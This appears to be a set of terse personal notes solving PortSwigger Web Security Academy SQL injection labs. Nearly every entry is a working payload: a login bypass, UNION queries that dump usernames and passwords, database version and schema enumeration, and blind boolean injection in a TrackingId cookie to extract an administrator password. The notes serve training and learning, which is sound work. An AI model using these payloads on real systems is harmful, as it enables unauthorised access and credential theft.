# 1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

https://ac691f8f1f1ade0ec09556480096009a.web-security-academy.net/filter?category=Food+&+Drink' or '1'='1


# 2 SQL injection vulnerability allowing login bypass

uname -> administrator
pass -> pass' or '1'='1


# 3 SQL injection UNION attack, determining the number of columns returned by the query

https://ac101f141ffe5241c02925c900cd00fb.web-security-academy.net/filter?category=Corporate+gifts' union select null,null,null--

# 4 SQL injection UNION attack, finding a column containing text

https://acc41f9a1e1d0567c0443b83007e0005.web-security-academy.net/filter?category=Corporate+gifts' union select null,'x3tSLc',null--

# 5 SQL injection UNION attack, retrieving data from other tables

https://acd91f8d1ed49ccdc0f3100900ea0060.web-security-academy.net/filter?category=Accessories' union select username,password from users--

# 6 SQL injection UNION attack, retrieving multiple values in a single column

https://acab1f321e54abdec0327ab800b70008.web-security-academy.net/filter?category=Corporate+gifts' union select null,username || '~' || password FROM users----

# 7 SQL injection attack, querying the database type and version on Oracle

https://ace01f1b1fe49816c0a468ad00de0029.web-security-academy.net/filter?category=Gifts%27+union+select+banner,+NULL+FROM+v$version--

# 8 SQL injection attack, querying the database type and version on MySQL and Microsoft

https://ac181f9e1e461c79c05e5cd700c9009a.web-security-academy.net/filter?category=Tech+gifts' union select @@version,null-- -



# 9 SQL injection attack, listing the database contents on non-Oracle databases

determine database version (PostgreSQL 11.15 (Debian 11.15-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit)

https://ac151f861ff1f580c06e17d600c3003d.web-security-academy.net/filter?category=Gifts' union select version(),null-- -

determine other tables in database

https://ac151f861ff1f580c06e17d600c3003d.web-security-academy.net/filter?category=Gifts' union SELECT table_name,null FROM information_schema.tables-- -

get column names from table

https://ac151f861ff1f580c06e17d600c3003d.web-security-academy.net/filter?category=Gifts' union SELECT column_name,null FROM information_schema.columns where table_name='users_srqfep'-- -

	password_mpzlug

	username_pihapd
	
Get data from table

https://ac151f861ff1f580c06e17d600c3003d.web-security-academy.net/filter?category=Gifts' union SELECT username_pihapd,password_mpzlug FROM users_srqfep-- -

# 10

# 11
finding password lenght

	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

finding password characters

	TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

check request_11.py